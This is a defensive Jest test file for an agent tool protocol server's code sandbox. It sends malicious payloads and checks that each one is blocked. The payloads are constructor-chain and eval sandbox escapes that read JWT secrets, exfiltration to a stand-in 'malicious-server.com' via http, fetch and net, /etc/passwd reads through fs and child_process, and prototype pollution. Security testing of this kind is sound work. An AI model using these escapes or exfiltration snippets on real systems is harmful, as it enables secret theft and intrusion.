/**
 * LIVE SECURITY TESTING
 *
 * Tests malicious HTTP requests against a running server to verify
 * all exploits are properly blocked in a real environment.
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import { AgentToolProtocolClient } from '@mondaydotcomorg/atp-client';

import {
	createTestATPServer,
	createCleanupTracker,
	cleanupAll,
	type TestServer,
	type CleanupTracker,
} from '../infrastructure/test-helpers';

describe('Live Malicious Request Testing', () => {
	let testServer: TestServer;
	let client: AgentToolProtocolClient;
	let cleanup: CleanupTracker;

	beforeAll(async () => {
		// Set required secrets for testing
		process.env.ATP_JWT_SECRET = 'test-secret-at-least-32-bytes-long-for-security';
		process.env.PROVENANCE_SECRET = 'provenance-secret-32-bytes-minimum-length';

		cleanup = createCleanupTracker();

		testServer = await createTestATPServer({
			execution: {
				timeout: 10000,
				memory: 128 * 1024 * 1024,
				llmCalls: 5,
			},
			apiGroups: [
				{
					name: 'test',
					type: 'custom',
					functions: [
						{
							name: 'echo',
							description: 'Echo input',
							inputSchema: {
								type: 'object',
								properties: { message: { type: 'string' } },
							},
							handler: async (input: any) => ({ echoed: input.message }),
						},
					],
				},
			],
		});

		cleanup.servers.push(testServer);

		client = new AgentToolProtocolClient({
			baseUrl: `http://localhost:${testServer.port}`,
		});
		await client.init();
		cleanup.clients.push(client);
	});

	afterAll(async () => {
		await cleanupAll(cleanup);
		delete process.env.ATP_JWT_SECRET;
		delete process.env.PROVENANCE_SECRET;
	});

	describe('Constructor Chain Sandbox Escapes', () => {
		test('BLOCK Object.getPrototypeOf() exploit', async () => {
			const exploit = `
				const F = Object.getPrototypeOf(function(){}).constructor;
				const evil = F('return process')();
				return evil.env.ATP_JWT_SECRET || 'EXPLOIT_FAILED';
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
		});

		test('BLOCK __proto__.constructor exploit', async () => {
			const exploit = `
				const ctor = ({}).__proto__.constructor.constructor;
				const getProcess = ctor('return process')();
				return getProcess.env.PROVENANCE_SECRET || 'EXPLOIT_FAILED';
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
		});

		test('BLOCK Object.setPrototypeOf() exploit', async () => {
			const exploit = `
				Object.setPrototypeOf({}, {
					get evil() {
						return this.constructor.constructor('return process')();
					}
				}).evil.env.ATP_JWT_SECRET
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
		});

		test('BLOCK Reflect.construct() exploit', async () => {
			const exploit = `
				const F = Reflect.construct(function(){}, []).constructor.constructor;
				return F('return process')().env.PROVENANCE_SECRET || 'EXPLOIT_FAILED';
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
		});
	});

	describe('Direct Eval and Function Constructor', () => {
		test('BLOCK direct eval() usage', async () => {
			const exploit = `eval('process.env.ATP_JWT_SECRET')`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
		});

		test('BLOCK new Function() constructor', async () => {
			const exploit = `new Function('return process.env.PROVENANCE_SECRET')()`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
		});

		test('BLOCK indirect eval via bracket notation', async () => {
			const exploit = `this['eval']('process.env.ATP_JWT_SECRET')`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
		});
	});

	describe('Process and Environment Access', () => {
		test('BLOCK direct process.env access', async () => {
			const exploit = `return process.env.ATP_JWT_SECRET;`;
			const result = await client.execute(exploit);

			if (result.status === 'completed') {
				expect(result.result).toBeUndefined();
			} else {
				expect(['security_violation', 'failed', 'parse_error']).toContain(result.status);
			}
		});

		test('BLOCK process.exit() attempt', async () => {
			const exploit = `process.exit(1);`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
		});
	});

	describe('External HTTP Requests (Data Exfiltration)', () => {
		test('BLOCK HTTP request with require("http")', async () => {
			const exploit = `
				const http = require('http');
				const secret = process.env.ATP_JWT_SECRET;
				http.get('http://malicious-server.com/exfil?secret=' + secret);
				return 'EXFILTRATION_ATTEMPTED';
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
			if (result.status === 'completed') {
				expect(result.result).not.toBe('EXFILTRATION_ATTEMPTED');
			}
		});

		test('BLOCK fetch() to external server', async () => {
			const exploit = `
				fetch('http://malicious-server.com/exfil', {
					method: 'POST',
					body: JSON.stringify({ secret: process.env.PROVENANCE_SECRET })
				});
				return 'EXFILTRATION_ATTEMPTED';
			`;
			const result = await client.execute(exploit);

			if (result.status === 'completed') {
				expect(result.result).not.toBe('EXFILTRATION_ATTEMPTED');
			}
		});
	});

	describe('Dangerous Module Imports', () => {
		test('BLOCK require("fs") for file system access', async () => {
			const exploit = `
				const fs = require('fs');
				const secret = fs.readFileSync('/etc/passwd', 'utf8');
				return secret;
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
		});

		test('BLOCK require("child_process") for command execution', async () => {
			const exploit = `
				const { execSync } = require('child_process');
				const output = execSync('cat /etc/passwd').toString();
				return output;
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
		});

		test('BLOCK require("net") for network access', async () => {
			const exploit = `
				const net = require('net');
				const socket = net.connect(80, 'malicious-server.com');
				socket.write(process.env.ATP_JWT_SECRET);
				return 'EXFILTRATION_ATTEMPTED';
			`;
			const result = await client.execute(exploit);

			expect(result.status).not.toBe('completed');
		});
	});

	describe('Prototype Pollution Attempts', () => {
		test('BLOCK Object.prototype pollution', async () => {
			const exploit = `
				Object.prototype.polluted = 'MALICIOUS_VALUE';
				return ({}).polluted;
			`;
			const result = await client.execute(exploit);

			expect(result.status).toBe('completed');

			const testObj = {};
			expect((testObj as any).polluted).toBeUndefined();
		}, 60000);

		test('BLOCK Array.prototype pollution', async () => {
			const exploit = `
				Array.prototype.polluted = function() { return 'COMPROMISED'; };
				return [].polluted();
			`;
			const result = await client.execute(exploit);

			expect(result.status).toBe('completed');

			const testArr: any[] = [];
			expect((testArr as any).polluted).toBeUndefined();
		}, 60000);
	});
});
